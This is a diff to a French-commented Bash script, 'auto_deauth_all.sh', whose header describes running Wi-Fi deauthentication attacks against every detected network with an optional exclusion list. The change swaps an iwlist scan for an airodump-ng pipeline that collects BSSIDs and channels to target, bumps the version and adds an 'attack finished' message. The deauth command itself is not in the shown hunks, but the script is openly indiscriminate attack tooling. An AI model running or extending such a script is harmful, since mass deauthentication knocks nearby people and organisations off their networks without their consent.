@@ -6,7 +6,7 @@
 #                  sur tous les réseaux Wi-Fi détectés, avec option d'exclusion.
 # Author         : rrtracer
 # Date           : 2024-10-27
-# Version        : 1.1
+# Version        : 1.2
 # License        : GPL-3.0
 # Usage          : ./auto_deauth_all.sh [options]
 # Bash Version   : 5.0+
@@ -69,9 +69,9 @@ fi
 # Préparation de la liste des BSSID exclus
 IFS=',' read -r -a exclude_array <<< "$exclude_bssids"
 
-# Scanner les réseaux Wi-Fi à proximité et extraire les BSSID et canaux
+# Scanner les réseaux Wi-Fi à proximité avec airodump-ng et extraire les BSSID et canaux
 echo "[*] Scanning des réseaux Wi-Fi à proximité..."
-networks=$(iwlist $interface scanning | awk '/Cell/ {print $5} /Channel/ {print $2}')
+networks=$(airodump-ng --write-interval 1 --output-format csv -w - $interface | awk -F, 'NR>2 {print $1, $4}' | grep -v "BSSID" | grep -v "^$")
 
 # Boucle pour chaque réseau détecté
 while IFS= read -r line; do
@@ -95,3 +95,6 @@ while IFS= read -r line; do
   # Pause avant de passer au réseau suivant
   sleep 2
 done <<< "$networks"
+
+echo "Attaque de désauthentification terminée."
+exit 0
